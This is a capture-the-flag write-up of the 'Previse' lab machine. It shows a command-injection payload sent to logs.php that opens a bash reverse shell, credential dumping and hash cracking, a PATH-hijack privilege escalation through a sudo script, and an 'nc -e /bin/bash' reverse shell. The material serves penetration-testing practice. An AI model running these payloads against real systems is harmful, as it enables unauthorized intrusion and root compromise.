# Scan

```bash
ghost@localhost [10:22:53] [~/Documents/hacking/tj-null-boxes/previse] [master]
-> % rustscan -a $IP -- -sC -sV
Open 10.10.11.104:22
Open 10.10.11.104:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53ed4440116e8bda698579c081f23a12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc5420ac1723bb5020f4e16e620f01b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33c189ea5973b1788438a421100c91d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80

It is running a file system. Running ferox buster does not gives anything.

With burpsuites, found a few php scripts

- files.php
- status.php
- accounts.php
- file_logs.php
- logs.php
- index.php
- logout.php

I intercept the response of `accounts.php` and return 200 Ok. From the page, I created an account `ghost:hackthebox`.

Under files page, I downloaded site back which contains database credential `root:mySQL_p@ssw0rd!:)` for `previse` database.

Looking through PHP files, the following file `logs.php` is vulnerable to code execution.

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

With burpsuite intercepting `logs.php` request, the following data is sent to the server to get reverse shell.

```bash
delim=comma; bash -c 'bash -i >& /dev/tcp/10.10.14.3/4445 0>&1'
```

# Getting user

Using the shell and database credential, I get into mysql and dump users.

```bash
www-data@previse:/var/www$ mysql -u root -p
mysql -u root -p
Enter password: mySQL_p@ssw0rd!:)

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 30
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use previse;
use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | ghost    | $1$🧂llol$/y6ghfDqprAyuaQsTsn0J1 | 2022-10-23 12:15:57 |
+----+----------+------------------------------------+---------------------+
2 rows in set (0.00 sec)

mysql> select TO_BASE64(password) from accounts where id = 1;
select TO_BASE64(password) from accounts where id = 1;
+--------------------------------------------------+
| TO_BASE64(password)                              |
+--------------------------------------------------+
| JDEk8J+ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg== |
+--------------------------------------------------+
1 row in set (0.00 sec)
```

I cracked the password with John The Ripper.

```bash
ghost@localhost [21:40:59] [~/Documents/hacking/tj-null-boxes/previse] [master *]
-> % sudo john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt m4lwhere
[sudo] password for ghost:
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:12 4.54% (ETA: 21:45:46) 0g/s 62411p/s 62411c/s 62411C/s yaboy13..y2kpmf
0g 0:00:00:14 5.35% (ETA: 21:45:43) 0g/s 62464p/s 62464c/s 62464C/s louche..lottie5
0g 0:00:00:17 6.53% (ETA: 21:45:42) 0g/s 62340p/s 62340c/s 62340C/s 998123..9960164
ilovecody112235! (?)
```

The user might be reusing the password, so I tried logging in to ssh with the password.

```bash
ghost@localhost [21:56:49] [~/Documents/hacking/tj-null-boxes/previse] [master *]
-> % ssh m4lwhere@10.10.11.104
m4lwhere@10.10.11.104's password:
```

# Privilege escalation

```bash
m4lwhere@previse:/opt/scripts$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

```bash
m4lwhere@previse:/opt/scripts$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

From the above `sudo -l` I realised that there's no `secure_path`. For example, this is how it should looks like. `secure_path` is to prevent changing path with sudo.

```bash
ghost@localhost [22:15:57] [~/Documents/hacking/tj-null-boxes/previse] [master *]
-> % sudo -l
[sudo] password for ghost:
Matching Defaults entries for ghost on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
```

and since the `access_backup.sh` is using `gzip`. We can actually override the `gzip` with own script. So when the `access_backup.sh` is executed with sudo, it will inherently executes our own script (overwritten to `gzip` path) with sudo.

```bash
m4lwhere@previse:~$ echo "bash" > gzip

m4lwhere@previse:~$ chmod +x gzip

m4lwhere@previse:~$ export PATH=.:$PATH

m4lwhere@previse:~$ which gzip
./gzip

m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh

root@previse:~# nc -nv 10.10.14.3 4445 -e /bin/bash
```

Then the root shell is capture on listener.

```bash
ghost@localhost [22:26:00] [~/Documents/hacking/tj-null-boxes/previse] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.104] 53158

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
dfe17****
```